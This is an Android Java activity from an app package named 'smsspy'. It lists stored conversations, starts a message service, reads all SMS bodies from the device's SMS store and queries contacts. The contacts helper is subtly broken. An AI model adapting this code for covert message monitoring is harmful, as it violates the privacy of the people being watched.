package com.spy.vksoni.smsspy;

import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ListView;
import android.widget.Toast;

import com.activeandroid.query.Select;
import com.spy.vksoni.smsspy.Adapter.ListViewAdapterConver;
import com.spy.vksoni.smsspy.DB.ConversationModel;
import com.spy.vksoni.smsspy.DB.DBHandler;
import com.spy.vksoni.smsspy.DB.SMSModel;
import com.spy.vksoni.smsspy.Services.MessageService;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
  public static  List<ContactBean> contactList;
  List<ConversationModel> conversationList;
  ListView listView;
 ListViewAdapterConver listViewAdapterConver;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        listView=(ListView)findViewById(R.id.listViewConversation);
        conversationList=new Select().all().from(ConversationModel.class).execute();

        listViewAdapterConver=new ListViewAdapterConver(getApplicationContext(),conversationList);
        listView.setAdapter(listViewAdapterConver);
        listView.setFitsSystemWindows(true);
        listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView <?> adapterView, View view, int i, long l) {

                String phone_no=conversationList.get(i).sender_name_number;
                startService(new Intent(MainActivity.this, MessageService.class));

                Intent intent=new Intent(MainActivity.this,MessageActivity.class);
            intent.putExtra("phone_no",phone_no );
                startActivity(intent);

            }
        });
    }


    public List<ContactBean> getContactsToList(){
        contactList=new ArrayList<ContactBean>();
        Cursor cursor=null;
        try {
            cursor = this.getContentResolver().query(ContactsContract.
                            CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null, null);
            this.startManagingCursor(cursor);


        }
        catch (Exception e){
            Toast.makeText(getApplicationContext(), ""+e.getMessage(), Toast.LENGTH_SHORT).show();
        }
        ContactBean contactBean=new ContactBean(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER);
        contactList.add(contactBean);
return contactList;

    }
    public static  List<ContactBean> getContactList(){
        return contactList;
    }

    public List<Demo> getSMS(){
        List<Demo> sms = new ArrayList<Demo>();
        Uri uriSMSURI = Uri.parse("content://sms");
        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);

        while (cur.moveToNext()) {
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
             Demo d=new Demo();
             d.msg=body;
             sms.add(d);
        }
        return sms;

    }
}
